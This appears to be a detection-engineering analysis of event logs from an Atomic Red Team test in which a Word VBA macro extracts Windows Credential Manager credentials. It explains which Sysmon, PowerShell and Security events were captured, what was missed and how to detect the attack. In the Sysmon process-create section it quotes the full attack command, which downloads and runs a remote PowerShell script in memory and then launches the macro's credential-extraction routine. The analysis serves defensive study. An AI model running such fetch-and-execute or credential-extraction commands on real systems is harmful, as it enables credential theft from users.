# T1555-1: Credentials from Password Stores — Extract Windows Credential Manager via VBA

## Technique Context

T1555 covers credential theft from password stores — repositories where the operating system and applications persist credentials between sessions. This test targets the Windows Credential Manager using a VBA macro embedded in a Word document. The Credential Manager stores two categories of credentials: Windows Credentials (domain authentication tokens, saved network share passwords, Remote Desktop credentials) and Web Credentials (browser-saved form logins, primarily from legacy Internet Explorer and EdgeHTML). Both vaults live under `%LOCALAPPDATA%\Microsoft\Credentials` and `%APPDATA%\Microsoft\Credentials`, encrypted with DPAPI.

The VBA macro approach simulates an adversary who has delivered a malicious Office document and induced the user to enable macros, or who is operating in a context where macro execution is already permitted. Rather than spawning obvious credential harvesting tools, the attack runs entirely within the Office process, making process-based detection less straightforward.

This test uses the `Invoke-MalDoc` helper from ART to drive a Word document with a macro file sourced from `C:\AtomicRedTeam\atomics\T1555\src\T1555-macrocode.txt`. The `Invoke-MalDoc.ps1` script is fetched at runtime from the ART GitHub repository (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`). The test ran on ACME-WS06 with Defender disabled.

## What This Dataset Contains

The dataset contains 211 total events: 41 Sysmon events, 166 PowerShell operational events, and 4 Security events. The application channel contributes no events in this sample.

**Sysmon EID 1 (Process Create)** captures two key process creation events. The first is the ART test framework identity check:

```
CommandLine: "C:\Windows\system32\whoami.exe"
User: NT AUTHORITY\SYSTEM
```

The second is the core attack command:

```
CommandLine: "powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""C:\AtomicRedTeam\atomics\T1555\src\T1555-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""}
CurrentDirectory: C:\Windows\TEMP\
User: NT AUTHORITY\SYSTEM
IntegrityLevel: System
```

This command line reveals the full attack chain: TLS 1.2 is explicitly set (for GitHub HTTPS compatibility), `Invoke-MalDoc.ps1` is fetched via `IEX`/`iwr` (an in-memory download and execute pattern), and the macro runs the `Extract` subroutine from the macro code file against a Word instance. The parent process is PowerShell running as SYSTEM.

**Sysmon EID 7 (Image Load)** accounts for 25 events, the largest category, recording DLL loads into PowerShell and the spawned Office process. Rule tags include `technique_id=T1055,technique_name=Process Injection`, `technique_id=T1059.001,technique_name=PowerShell`, and `technique_id=T1574.002,technique_name=DLL Side-Loading`.

**Sysmon EID 10 (Process Access)** captures 4 events with `GrantedAccess: 0x1FFFFF`, consistent with process spawning mechanics.

**Sysmon EID 17 (Pipe Create)** captures 3 named pipe creation events with the `\PSHost.*` naming pattern (standard PowerShell hosting infrastructure).

**Sysmon EID 11 (File Create)** captures 3 file creation events including PowerShell startup profile data files at `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\`.

The Sysmon EID breakdown also includes 1 EID 3 (Network Connection) and 1 EID 22 (DNS Query), which captured the outbound connection to download `Invoke-MalDoc.ps1` from GitHub, though these specific events are not in the sampled 20 Sysmon events.

**Security EID 4688** captures four process creation events, primarily for the PowerShell and `whoami.exe` executions.

**PowerShell EID 4104 (Script Block Logging)** generates 161 script block events, reflecting multiple PowerShell instances spawned by the test framework and the `Invoke-MalDoc` execution. The sampled events are largely boilerplate (`Set-StrictMode` formatters, `Set-ExecutionPolicy Bypass`) plus the `$ErrorActionPreference = 'Continue'` setting and a `Write-Host "DONE"` completion marker via EID 4103.

## What This Dataset Does Not Contain

**The VBA macro execution itself is not captured in Windows event logs.** The credential extraction performed by the Word macro runs inside `WINWORD.EXE` as a COM automation invocation. Windows event logs do not natively record Office macro execution, the specific VBA subroutines called, or their output. The actual Credential Manager API calls made by the macro (`CredEnumerate`, vault enumeration functions) are not represented in any event channel here.

**No Sysmon EID 12/13 (Registry) or specific Credential Manager access events** appear. Security EID 5379 (Credential Manager credentials were read) and EID 5381 (Vault credentials were read), which appear in T1555-4, are absent here. This is consistent with the macro interacting with Credential Manager through COM/Office automation rather than direct system calls that trigger credential access auditing.

**No Office-specific Application event log entries** are captured in the sampled events, though the EID 15 application events noted in the channel statistics for similar tests may include Office or runtime errors from the macro execution.

**No network connection details** for the `Invoke-MalDoc.ps1` download are in the sampled events (the EID 3 and EID 22 events fall outside the 20-event sample window), though their presence in the eid_breakdown confirms they were recorded.

**No credential output.** Any credentials successfully extracted by the macro are printed to the Word document or returned to PowerShell output — neither appears in the event logs.

## Assessment

With Defender disabled, the complete attack chain executes: PowerShell fetches `Invoke-MalDoc.ps1` from GitHub, Word launches with the macro file, and the `Extract` subroutine runs against the Credential Manager. The dataset captures the delivery mechanism clearly but the credential extraction itself is a blind spot in Windows event logging.

The undefended dataset provides a more complete picture of the attack infrastructure than the defended variant. In the defended run (49 PowerShell events, 36 Sysmon, 10 Security), Defender interrupts execution. Here, the 166 PowerShell events reflect the full test framework run through completion, and the network connection to GitHub (EID 3/22) confirms the remote payload was retrieved.

The use of `IEX` with `iwr` to fetch a script from GitHub and immediately execute it in memory is a classic living-off-the-land delivery pattern. The lack of the payload ever touching disk as a `.ps1` file means file-based detection would miss it — only the process creation command line or script block logging would capture the URL and the `IEX` pattern.

## Detection Opportunities Present in This Data

**Sysmon EID 1** provides the highest-value detection opportunity: the command line includes `IEX (iwr "https://raw.githubusercontent.com/redcanaryco/...)` combined with `Invoke-Maldoc`, both strong behavioral indicators. The execution from `C:\Windows\TEMP\` as `NT AUTHORITY\SYSTEM` with a parent PowerShell process is an unusual pattern for legitimate Office document processing.

**PowerShell EID 4104** would capture the `IEX (iwr ...)` pattern in script block logging. The URL itself (`raw.githubusercontent.com/redcanaryco/atomic-red-team/...`) is present in the process creation command line.

**Sysmon EID 3 and EID 22** (confirmed present via eid_breakdown: 1 each) capture the outbound network connection and DNS resolution for `raw.githubusercontent.com` from the PowerShell process — a strong indicator when the destination is GitHub raw content, particularly from a SYSTEM-context process.

**Security EID 4688** captures the same command line as Sysmon EID 1 and provides an alternative logging path for environments that have not deployed Sysmon.

The combination of GitHub raw content download via `IEX`/`iwr` in a SYSTEM-context PowerShell process, followed by Word document manipulation, represents a distinctive behavioral cluster that warrants investigation in any production environment.
